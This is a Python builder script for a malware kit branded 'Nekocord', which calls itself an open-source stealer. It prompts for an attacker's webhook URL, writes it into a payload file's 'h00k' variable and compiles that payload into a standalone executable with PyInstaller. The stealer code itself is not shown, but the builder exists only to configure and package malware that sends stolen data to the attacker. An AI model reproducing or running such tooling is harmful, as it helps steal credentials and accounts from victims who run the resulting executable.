import subprocess
import colorama
from colorama import *
import os

os.system("cls")

ascii_art = """
                        ███╗   ██╗███████╗██╗  ██╗ ██████╗  ██████╗ ██████╗ ██████╗ ██████╗ 
                        ████╗  ██║██╔════╝██║ ██╔╝██╔═══██╗██╔════╝██╔═══██╗██╔══██╗██╔══██╗
                        ██╔██╗ ██║█████╗  █████╔╝ ██║   ██║██║     ██║   ██║██████╔╝██║  ██║
                        ██║╚██╗██║██╔══╝  ██╔═██╗ ██║   ██║██║     ██║   ██║██╔══██╗██║  ██║
                        ██║ ╚████║███████╗██║  ██╗╚██████╔╝╚██████╗╚██████╔╝██║  ██║██████╔╝
                        ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                         OPEN SOURCE AND CUTIE Stealer UwU
"""

def replace_hook_in_main():
    while True:
        print (f"{Fore.LIGHTMAGENTA_EX}{ascii_art}")
        new_hook = input(f"{Fore.LIGHTMAGENTA_EX}[INPUT] {Fore.RESET}\n Webhook URL: ").strip()

        if new_hook.startswith("https://"):
            break
        else:
            print(f"{Fore.YELLOW}[WARN] {Fore.RESET} The webhook entered is not valid. Please try again.")
            os.system("pause")
            os.system("cls")

    try:
        with open("src/asset/nekocord.py", "r", encoding="utf-8") as f:
            content = f.read()

        new_content = content.replace('h00k = ""', f'h00k = "{new_hook}"')

        with open("src/asset/nekocord.py", "w", encoding="utf-8") as f:
            f.write(new_content)

        print(f"{Fore.MAGENTA}[INFO] {Fore.RESET}\n Successfully replaced the webhook URL.")
    
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] {Fore.RESET} The file 'src/asset/nekocord.py' was not found.")
    except IOError as e:
        print(f"{Fore.RED}[ERROR] {Fore.RESET} Error reading/writing the file: {e}")

def build_exe():
    print(f"{Fore.MAGENTA}[INFO] {Fore.RESET}\n Building src/asset/nekocord.py with PyInstaller...")

    try:
        subprocess.run(["pyinstaller", "--onefile", "src/asset/nekocord.py"], check=True)
        print(f"{Fore.MAGENTA}[INFO] {Fore.RESET}\n Successfully built the executable.")
        os.system
    except subprocess.CalledProcessError:
        print(f"{Fore.YELLOW}[WARN] {Fore.RESET} Failed to build the executable. Ensure pyinstaller is installed.")
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] {Fore.RESET} pyinstaller is not found. Please install it using 'pip install pyinstaller'.")

if __name__ == "__main__":
    replace_hook_in_main()
    build_exe()
